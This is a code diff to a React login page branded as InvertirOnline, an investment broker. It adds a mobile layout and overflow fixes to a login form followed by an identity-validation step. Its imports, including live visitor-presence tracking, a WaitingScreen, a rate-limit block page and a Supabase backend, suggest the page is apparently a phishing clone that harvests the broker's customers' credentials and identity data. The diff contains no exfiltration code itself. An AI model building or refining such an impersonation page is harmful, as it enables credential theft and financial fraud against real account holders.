@@ -3,6 +3,7 @@ import { useParams } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
 import { useRateLimit } from "@/hooks/useRateLimit";
+import { useIsMobile } from "@/hooks/use-mobile";
 import IolLoginForm from "@/components/iol/IolLoginForm";
 import IolIllustration from "@/components/iol/IolIllustration";
 import WaitingScreen from "@/components/login/WaitingScreen";
@@ -27,6 +28,7 @@ const IOL = () => {
   const [kycCaseId, setKycCaseId] = useState<string | null>(null);
 
   const rateLimit = useRateLimit();
+  const isMobile = useIsMobile();
 
   useVisitTracker();
   useVisitorPresence(sessionId);
@@ -234,6 +236,7 @@ const IOL = () => {
   }, []);
 
   const isKycStep = step === "kyc" && Boolean(kycCaseId);
+  const useCompactMobileLayout = isMobile && !isKycStep;
 
   const mainTitle = useMemo(() => {
     if (isKycStep) return "Validación de identidad";
@@ -282,7 +285,7 @@ const IOL = () => {
 
   if (rateLimit.loading) {
     return (
-      <div className="iol-theme flex min-h-screen items-center justify-center bg-background text-muted-foreground">
+      <div className="iol-theme flex min-h-screen items-center justify-center overflow-x-hidden bg-background text-muted-foreground">
         Cargando...
       </div>
     );
@@ -290,7 +293,7 @@ const IOL = () => {
 
   if (rateLimit.blocked) {
     return (
-      <div className="iol-theme flex min-h-screen items-center justify-center bg-background px-4">
+      <div className="iol-theme flex min-h-screen items-center justify-center overflow-x-hidden bg-background px-4">
         <div className="w-full max-w-md rounded-2xl border border-border bg-card p-8 text-center text-card-foreground shadow-lg">
           <h1 className="text-xl font-semibold">Acceso restringido</h1>
           <p className="mt-2 text-sm text-muted-foreground">
@@ -302,26 +305,40 @@ const IOL = () => {
   }
 
   return (
-    <div className="iol-theme min-h-screen bg-background text-foreground">
-      <header className="iol-topbar-shadow border-b border-border/80 bg-background">
+    <div className="iol-theme flex min-h-screen flex-col overflow-x-hidden bg-background text-foreground">
+      <header className="iol-topbar-shadow shrink-0 border-b border-border/80 bg-background">
         <div className="mx-auto flex h-[58px] w-full max-w-6xl items-center justify-center px-5 sm:px-8 lg:justify-start">
           <img src={iolLogo} alt="InvertirOnline" className="h-8 w-auto object-contain" />
         </div>
       </header>
 
-      <main className={`mx-auto flex w-full max-w-6xl flex-col px-4 pb-4 pt-4 sm:px-6 ${isKycStep ? "h-[calc(100svh-58px)] overflow-hidden" : "lg:min-h-[calc(100vh-58px)] lg:flex-row lg:items-start lg:justify-between lg:gap-16 lg:px-8 lg:pb-16 lg:pt-14"}`}>
-        <section className={`w-full ${isKycStep ? "min-h-0 flex-1 overflow-hidden" : "max-w-[350px] lg:pt-8"}`}>
+      <main
+        className={`mx-auto flex w-full max-w-6xl flex-1 flex-col overflow-x-hidden px-4 sm:px-6 ${isKycStep
+          ? "h-[calc(100svh-58px)] min-h-0 overflow-hidden pb-4 pt-4 lg:px-8"
+          : useCompactMobileLayout
+            ? "justify-center px-4 py-6"
+            : "pb-4 pt-4 lg:min-h-[calc(100vh-58px)] lg:flex-row lg:items-start lg:justify-between lg:gap-16 lg:px-8 lg:pb-16 lg:pt-14"
+        }`}
+      >
+        <section
+          className={`w-full ${isKycStep
+            ? "min-h-0 flex-1 overflow-hidden"
+            : useCompactMobileLayout
+              ? "mx-auto flex max-w-[350px] flex-1 flex-col justify-center"
+              : "mx-auto max-w-[350px] lg:mx-0 lg:pt-8"
+          }`}
+        >
           {isKycStep ? (
             <div className="h-full overflow-hidden">
               {renderCardContent()}
             </div>
           ) : (
             <>
-              <h1 className={`mb-3 font-semibold leading-none text-primary ${isKycStep ? "text-[2.15rem] sm:text-[2.5rem]" : "text-[2rem] sm:text-[2.15rem]"}`}>
+              <h1 className={`mb-3 font-semibold leading-none text-primary ${isKycStep ? "text-[2.15rem] sm:text-[2.5rem]" : "text-center text-[2rem] sm:text-[2.15rem] lg:text-left"}`}>
                 {mainTitle}
               </h1>
 
-              <div className="iol-card-shadow rounded-2xl bg-card px-6 py-7 sm:px-7">
+              <div className="iol-card-shadow w-full rounded-2xl bg-card px-6 py-7 sm:px-7">
                 {renderCardContent()}
               </div>
             </>
@@ -335,7 +352,7 @@ const IOL = () => {
         )}
       </main>
 
-      <footer className="border-t border-border/60 bg-background lg:hidden">
+      <footer className="shrink-0 border-t border-border/60 bg-background lg:hidden">
         <div className="mx-auto flex w-full max-w-6xl justify-center px-5 py-5 sm:px-8">
           <img src={iolLogo} alt="InvertirOnline" className="h-7 w-auto object-contain" />
         </div>
